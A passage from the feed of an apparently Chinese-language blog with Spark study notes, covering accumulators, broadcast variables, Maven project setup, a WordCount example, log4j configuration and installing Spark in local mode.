class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">new</span> WordCountAccumulator<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 重置累加器</span><span class="token keyword">override</span> <span class="token keyword">def</span> reset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  map<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 向累加器中增加数据 (In)</span><span class="token keyword">override</span> <span class="token keyword">def</span> add<span class="token punctuation">(</span>word<span class="token operator">:</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 查询map中是否存在相同的单词</span>    <span class="token comment" spellcheck="true">// 如果有相同的单词，那么单词的数量加1</span>    <span class="token comment" spellcheck="true">// 如果没有相同的单词，那么在map中增加这个单词</span>    map<span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">=</span> map<span class="token punctuation">.</span>getOrElse<span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">0L</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1L</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 合并累加器</span><span class="token keyword">override</span> <span class="token keyword">def</span> merge<span class="token punctuation">(</span>other<span class="token operator">:</span> AccumulatorV2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">val</span> map1 <span class="token operator">=</span> map  <span class="token keyword">val</span> map2 <span class="token operator">=</span> other<span class="token punctuation">.</span>value  <span class="token comment" spellcheck="true">// 两个Map的合并</span>  map <span class="token operator">=</span> map1<span class="token punctuation">.</span>foldLeft<span class="token punctuation">(</span>map2<span class="token punctuation">)</span><span class="token punctuation">(</span>    <span class="token punctuation">(</span> innerMap<span class="token punctuation">,</span> kv <span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      innerMap<span class="token punctuation">(</span>kv<span class="token punctuation">.</span>_1<span class="token punctuation">)</span> <span class="token operator">=</span> innerMap<span class="token punctuation">.</span>getOrElse<span class="token punctuation">(</span>kv<span class="token punctuation">.</span>_1<span class="token punctuation">,</span> <span class="token number">0L</span><span class="token punctuation">)</span> <span class="token operator">+</span> kv<span class="token punctuation">.</span>_2      innerMap    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 返回累加器的结果 （Out）</span><span class="token keyword">override</span> <span class="token keyword">def</span> value<span class="token operator">:</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span> <span class="token operator">=</span> map<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-广播变量"><a href="#2-3-广播变量" class="headerlink" title="2.3 广播变量"></a>2.3 广播变量</h2><h3 id="2-3-1-实现原理"><a href="#2-3-1-实现原理" class="headerlink" title="2.3.1 实现原理"></a>2.3.1 实现原理</h3><p>广播变量用来高效分发较大的对象。向所有工作节点发送一个较大的只读值，以供一个或多个Spark操作使用。比如，如果你的应用需要向所有节点发送一个较大的只读查询表，广播变量用起来都很顺手。在多个并行操作中使用同一个变量，但是 Spark会为每个任务分别发送。</p><h3 id="2-3-2-基础编程"><a href="#2-3-2-基础编程" class="headerlink" title="2.3.2 基础编程"></a>2.3.2 基础编程</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> rdd1 <span class="token operator">=</span> sc<span class="token punctuation">.</span>makeRDD<span class="token punctuation">(</span>List<span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">val</span> list <span class="token operator">=</span> List<span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 声明广播变量</span><span class="token keyword">val</span> broadcast<span class="token operator">:</span> Broadcast<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>broadcast<span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token keyword">val</span> resultRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">Int</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> rdd1<span class="token punctuation">.</span>map <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">// 使用广播变量</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token keyword">&lt;-</span> broadcast<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> key<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        num2 <span class="token operator">=</span> v      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token punctuation">(</span>num<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Spark/">Spark</category>
      
      
      <comments>https://m01ly.github.io/2020/11/29/bigdata-Spark2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Spark学习笔记（一） 搭建Spark</title>
      <link>https://m01ly.github.io/2020/11/29/bigdata-Spark1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/29/bigdata-Spark1-setup/</guid>
      <pubDate>Sun, 29 Nov 2020 03:15:49 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Spark概述"><a href="#1-Spark概述" class="headerlink" title="1 Spark概述"></a>1 Spark概述</h1><h2 id="1-1-spark-or-haddop"><a href="#1-1-spark-or-haddop" class="headerlink" title="1.1 spark or haddop"></a>1.1 spark or haddop</h2><p>MR框架主要应用于数据的一次性计算：存存储介质中读取数据，然后进行过处理后，再存储到文件中。IO读取多，效率低。</p><p>1）Spark是基于MR框架的，但是优化了其中的计算过程，使用内存来代替计算结果。减少了磁盘IO，因此快。（MR多作业之间会多次磁盘的IO，因此慢）</p><p>2）Spark基于Scala语言开发的，更适合迭代计算和数据挖掘计算</p><p>3） Spark中计算模型非常丰富（MR中只有两个计算模型：mapper和reducer）;spark的计算模型有：map,filter,groupby,sortby。</p><p>工作中：是Spark中和Yarn联合使用：资源用的是Yarn,计算用的是spark。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638156481825.png" alt="1638156481825"></p><h2 id="1-2-Spark核心模块"><a href="#1-2-Spark核心模块" class="headerlink" title="1.2 Spark核心模块"></a>1.2 Spark核心模块</h2><h2 id="1-1-Spark-核心模块"><a href="#1-1-Spark-核心模块" class="headerlink" title="1.1 Spark 核心模块"></a>1.1 Spark 核心模块</h2><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176912041.png" alt="1638176912041"></p><p>1）<strong>Spark Core</strong></p><p>Spark Core中提供了Spark最基础与最核心的功能，Spark其他的功能如：Spark SQL，Spark Streaming，GraphX, MLlib都是在Spark Core的基础上进行扩展的</p><p>2） <strong>Spark SQL</strong></p><p>Spark SQL是Spark用来操作结构化数据的组件。通过Spark SQL，用户可以使用SQL或者Apache Hive版本的SQL方言（HQL）来查询数据。</p><ol start="3"><li><strong>Spark Streaming</strong></li></ol><p>Spark Streaming是Spark平台上针对实时数据进行流式计算的组件，提供了丰富的处理数据流的API。</p><p>4） <strong>Spark MLlib</strong></p><p>MLlib是Spark提供的一个机器学习算法库。MLlib不仅提供了模型评估、数据导入等额外的功能，还提供了一些更底层的机器学习原语。</p><p>5）<strong>Spark GraphX</strong></p><p>GraphX是Spark面向图计算提供的框架与算法库。</p><h1 id="2-Spark快速上手"><a href="#2-Spark快速上手" class="headerlink" title="2 Spark快速上手"></a>2 Spark快速上手</h1><p>在大数据早期的课程中我们已经学习了MapReduce框架的原理及基本使用，并了解了其底层数据处理的实现方式。接下来，就让咱们走进Spark的世界，了解一下它是如何带领我们完成数据处理的。</p><h2 id="2-1-创建Maven项目"><a href="#2-1-创建Maven项目" class="headerlink" title="2.1  创建Maven项目"></a>2.1  创建Maven项目</h2><h3 id="2-1-1-增加Scala插件"><a href="#2-1-1-增加Scala插件" class="headerlink" title="2.1.1 增加Scala插件"></a>2.1.1 增加Scala插件</h3><p>Spark由Scala语言开发的，所以本课件接下来的开发所使用的语言也为Scala，咱们当前使用的Spark版本为3.0.0，默认采用的Scala编译版本为2.12，所以后续开发时。我们依然采用这个版本。开发前请保证IDEA开发工具中含有Scala开发插件。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176561427.png" alt="1638176561427"></p><h3 id="2-1-2-增加依赖关系"><a href="#2-1-2-增加依赖关系" class="headerlink" title="2.1.2 增加依赖关系"></a>2.1.2 增加依赖关系</h3><p>修改Maven项目中的POM文件，增加Spark框架的依赖关系。本课件基于Spark3.0版本，使用时请注意对应版本。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.spark<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spark-core_2.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 该插件用于将Scala代码编译成class文件 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>net.alchim31.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>scala-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                    <span class="token comment" spellcheck="true">&lt;!-- 声明绑定到maven的compile阶段 --></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>testCompile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-3-WordCount"><a href="#2-1-3-WordCount" class="headerlink" title="2.1.3 WordCount"></a>2.1.3 WordCount</h3><p>为了能直观地感受Spark框架的效果，接下来我们实现一个大数据学科中最常见的教学案例WordCount</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 创建Spark运行配置对象</span><span class="token keyword">val</span> sparkConf <span class="token operator">=</span> <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local[*]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"WordCount"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 创建Spark上下文环境对象（连接对象）</span><span class="token keyword">val</span> sc <span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 读取文件数据</span><span class="token keyword">val</span> fileRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"input/word.txt"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将文件中的数据进行分词</span><span class="token keyword">val</span> wordRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> fileRDD<span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span> _<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 转换数据结构 word => (word, 1)</span><span class="token keyword">val</span> word2OneRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> wordRDD<span class="token punctuation">.</span>map<span class="token punctuation">(</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将转换结构后的数据按照相同的单词进行分组聚合</span><span class="token keyword">val</span> word2CountRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> word2OneRDD<span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_<span class="token operator">+</span>_<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将数据聚合结果采集到内存中</span><span class="token keyword">val</span> word2Count<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> word2CountRDD<span class="token punctuation">.</span>collect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 打印结果</span>word2Count<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//关闭Spark连接</span>sc<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行过程中，会产生大量的执行日志，如果为了能够更好的查看程序的执行结果，可以在项目的resources目录中创建log4j.properties文件，并添加日志配置信息：</p><pre class="line-numbers language-properties"><code class="language-properties"><span class="token attr-name">log4j.rootCategory</span><span class="token punctuation">=</span><span class="token attr-value">ERROR, console</span><span class="token attr-name">log4j.appender.console</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.ConsoleAppender</span><span class="token attr-name">log4j.appender.console.target</span><span class="token punctuation">=</span><span class="token attr-value">System.err</span><span class="token attr-name">log4j.appender.console.layout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.PatternLayout</span><span class="token attr-name">log4j.appender.console.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token attr-value">%d&amp;#123;yy/MM/dd HH:mm:ss&amp;#125; %p %c&amp;#123;1&amp;#125;: %m%n</span><span class="token comment" spellcheck="true"># Set the default spark-shell log level to ERROR. When running the spark-shell, the</span><span class="token comment" spellcheck="true"># log level for this class is used to overwrite the root logger's log level, so that</span><span class="token comment" spellcheck="true"># the user can have different defaults for the shell and regular Spark apps.</span><span class="token attr-name">log4j.logger.org.apache.spark.repl.Main</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token comment" spellcheck="true"># Settings to quiet third party logs that are too verbose</span><span class="token attr-name">log4j.logger.org.spark_project.jetty</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token attr-name">log4j.logger.org.spark_project.jetty.util.component.AbstractLifeCycle</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token attr-name">log4j.logger.org.apache.spark.repl.SparkIMain$exprTyper</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token attr-name">log4j.logger.org.apache.spark.repl.SparkILoop$SparkILoopInterpreter</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token attr-name">log4j.logger.org.apache.parquet</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token attr-name">log4j.logger.parquet</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span class="token comment" spellcheck="true"># SPARK-9183: Settings to avoid annoying messages when looking up nonexistent UDFs in SparkSQL with Hive support</span><span class="token attr-name">log4j.logger.org.apache.hadoop.hive.metastore.RetryingHMSHandler</span><span class="token punctuation">=</span><span class="token attr-value">FATAL</span><span class="token attr-name">log4j.logger.org.apache.hadoop.hive.ql.exec.FunctionRegistry</span><span class="token punctuation">=</span><span class="token attr-value">ERROR</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-4-异常处理"><a href="#2-1-4-异常处理" class="headerlink" title="2.1.4 异常处理"></a>2.1.4 异常处理</h3><p>如果本机操作系统是Windows，在程序中使用了Hadoop相关的东西，比如写入文件到HDFS，则会遇到如下异常：</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176731823.png" alt="1638176731823"></p><p>出现这个问题的原因，并不是程序的错误，而是windows系统用到了hadoop相关的服务，解决办法是通过配置关联到windows的系统依赖就可以了</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176805506.png" alt="1638176805506"></p><p>在IDEA中配置Run Configuration，添加HADOOP_HOME变量</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176855314.png" alt="1638176855314"></p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176879056.png" alt="1638176879056"></p><h1 id="3-Spark运行环境"><a href="#3-Spark运行环境" class="headerlink" title="3 Spark运行环境"></a>3 Spark运行环境</h1><p>Spark作为一个数据处理框架和计算引擎，被设计在所有常见的集群环境中运行, 在国内工作中主流的环境为Yarn，不过逐渐<strong>容器式环境</strong>也慢慢流行起来。接下来，我们就分别看看不同环境下Spark的运行。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176475372.png" alt="1638176475372"></p><h2 id="3-1-Local模式"><a href="#3-1-Local模式" class="headerlink" title="3.1  Local模式"></a>3.1  Local模式</h2><p>所谓的<strong>Local模式，就是不需要其他任何节点资源就可以在本地执行Spark代码的环境</strong>，一般用于教学，调试，演示等，之前在IDEA中运行代码的环境我们称之为<strong>开发环境</strong>，不太一样。（<strong>Local=本机提供资源+spark提供计算</strong>）</p><h3 id="3-1-1-解压缩文件"><a href="#3-1-1-解压缩文件" class="headerlink" title="3.1.1 解压缩文件"></a>3.1.1 解压缩文件</h3><p>将spark-3.0.0-bin-hadoop3.2.tgz文件上传到Linux并解压缩，放置在指定位置，路径中不要包含中文或空格，课件后续如果涉及到解压缩操作，不再强调。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module<span class="token function">cd</span> /opt/module <span class="token function">mv</span> spark-3.0.0-bin-hadoop3.2 spark-local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-启动Local环境"><a href="#3-1-2-启动Local环境" class="headerlink" title="3.1.2 启动Local环境"></a>3.1.2 启动Local环境</h3><ol><li>进入解压缩后的路径，执行如下指令</li></ol><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638173742050.png" alt="1638173742050"></p><ol start="2"><li>启动成功后，可以输入网址进行Web UI<strong>监控页面</strong>访问</li></ol><p>http://虚拟机地址:4040</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176427950.png" alt="1638176427950"></p><h3 id="3-1-3-命令行工具"><a href="#3-1-3-命令行工具" class="headerlink" title="3.1.3 命令行工具"></a>3.1.3 命令行工具</h3><p>在解压缩文件夹下的data目录中，添加word.txt文件。在命令行工具中执行如下代码指令（和IDEA中代码简化版一致）</p><pre 